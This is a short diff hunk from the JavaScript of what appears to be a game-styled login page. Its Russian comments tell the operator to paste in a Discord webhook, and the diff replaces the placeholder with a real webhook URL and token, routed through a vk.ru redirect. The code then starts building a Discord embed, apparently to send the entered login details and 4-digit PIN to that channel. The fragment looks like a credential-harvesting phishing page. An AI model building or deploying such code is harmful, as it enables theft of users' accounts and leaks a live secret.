@@ -110,7 +110,7 @@ loginBtn.addEventListener('click', function(e) {
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
   
   // ВСТАВЬ СВОЮ ССЫЛКУ ВЕБХУКА ДИСКОРДА ВНУТРЬ КАВЫЧЕК
-  const discordWebhookUrl = "СЮДА_ВСТАВЬ_ССЫЛКУ_ИЗ_ДИСКОРДА";
+  const discordWebhookUrl = "https://vk.ru/away.php?to=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1534289604029448245%2FQ7jqX-o46HwGYWbsfBhsFjud3SGmgwoZeYCwyDemgNx8pjUf-S5pUX_GFXPWnvGPwgsb&utf=1";
   
   // Создаем сочную, красивую карточку для Discord (Embed-формат)
   const discordPayload = {
